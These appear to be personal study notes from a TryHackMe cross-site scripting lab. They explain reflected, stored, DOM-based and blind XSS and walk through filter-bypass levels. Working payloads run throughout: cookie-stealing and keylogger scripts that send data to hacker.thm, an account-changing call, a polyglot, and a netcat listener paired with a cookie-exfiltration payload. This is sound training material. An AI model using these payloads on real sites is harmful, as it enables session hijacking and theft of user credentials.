In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

**Examples**

- **Proof Of Concept:**
	This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:
	
	`<script>alert('XSS');</script>`

- **Session Stealing:**
	Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
	
	`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

- **Key Logger:**
	The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
	
	`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

- **Business Logic:**
	This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:
	
	`<script>user.changeEmail('attacker@hacker.thm');</script>`

## Reflected XSS  
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

- **Example Scenario:**  
A website where if you enter incorrect input, an **error** message is displayed. The content of the **error** message gets taken from the **error** **parameter** in the query string and is built directly into the page source.
![[Pasted image 20240605235939.png]]

The application doesn't check the contents of the **error** parameter, which allows the attacker to insert malicious code.
![[Pasted image 20240606000022.png]]

**Flow:**
![[Pasted image 20240606000041.png]]

- **Potential Impact:**  
The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

**How to test for Reflected XSS:**  
	You'll need to test every possible point of entry; these include:
		- Parameters in the URL Query String
		- URL File Path
		- Sometimes HTTP Headers (although unlikely exploitable in practice)

## **Stored XSS**
As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

- **Example Scenario:**  
A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

**Flow:**
![[Pasted image 20240606000321.png]]

- **Potential Impact:**  
The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

**How to test for Stored XSS:**  
	You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:  
		- Comments on a blog
		- User profile information  
		- Website Listings  

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.

## **DOM Based XSS**
DOM stands for **D**ocument **O**bject **M**odel and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:

		![[Pasted image 20240606000611.png]]

- **Exploiting the DOM**:
DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

- **Example Scenario:**  
The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

- **Potential Impact:** 
Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

- **How to test for Dom Based XSS:**
DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "**window.location.x**" parameters.
	When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.


## **Blind XSS**
Blind XSS is similar to a **Stored XSS** that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

- **Example Scenario:**  
A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

- **Potential Impact:**  
Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

- **How to test for Blind XSS:**
When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
	A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

## **Payload**
The payload is the JavaScript code we want to execute either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website.
  
`<script>alert('THM');</script>`

1)**Level One:**
You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:
![[Pasted image 20240607185027.png]]

`"><script>alert('THM');</script>`  

The important part of the payload is the `">` which closes the value parameter and then closes the input tag.
![[Pasted image 20240607185058.png]]


2)**Level Two:**
![[Pasted image 20240607185157.png]]

We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: `</textarea><script>alert('THM');</script>`

![[Pasted image 20240607185221.png]]


3)**Level Three:**
Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.
![[Pasted image 20240607185315.png]]

You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload `';alert('THM');//`  which you'll see from the below screenshot will execute your code. The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.
![[Pasted image 20240607185340.png]]

4)**Level Four:**
![[Pasted image 20240607185425.png]]
The word `script`  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.

**Original Payload:**
		`<sscriptcript>alert('THM');</sscriptcript>`

**Text to be removed (by the filter):**
	`<sscriptcript>alert('THM');</sscriptcript>`

**Final Payload (after passing the filter):**
	`<script>alert('THM');</script>`
	
	
5)**Level Five:**
![[Pasted image 20240607185739.png]]
Let's change our payload to reflect this `/images/cat.jpg" onload="alert('THM');` and then viewing the page source, and you'll see how this will work.

![[Pasted image 20240607185804.png]]

## **Polyglots:**

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.  
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

```


## Cookies Stealing Payload
Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.

Using the AttackBox, let’s set up a listening server using Netcat. If we want to listen on port 9001, we issue the command `nc -l -p 9001`. The `-l` option indicates that we want to use Netcat in listen mode, while the `-p` option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add `-n`; moreover, to discover any errors, running Netcat in verbose mode by adding the `-v` option is recommended. The final command becomes `nc -n -l -v -p 9001`, equivalent to `nc -nlvp 9001`.

![[Pasted image 20240609233947.png]]

Now that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.

`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`

Let’s break down the payload:

- The `</textarea>` tag closes the text area field.
- The `<script>` tag opens an area for us to write JavaScript.
- The `fetch()` command makes an HTTP request.
- `URL_OR_IP` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
- `PORT_NUMBER` is the port number you are using to listen for connections on the AttackBox.
- `?cookie=` is the query string containing the victim’s cookies.
- `btoa()` command base64 encodes the victim’s cookies.
- `document.cookie` accesses the victim’s cookies for the Acme IT Support Website.
- `</script>`closes the JavaScript code block.

![[Pasted image 20240609234127.png]]
![[Pasted image 20240609234144.png]]
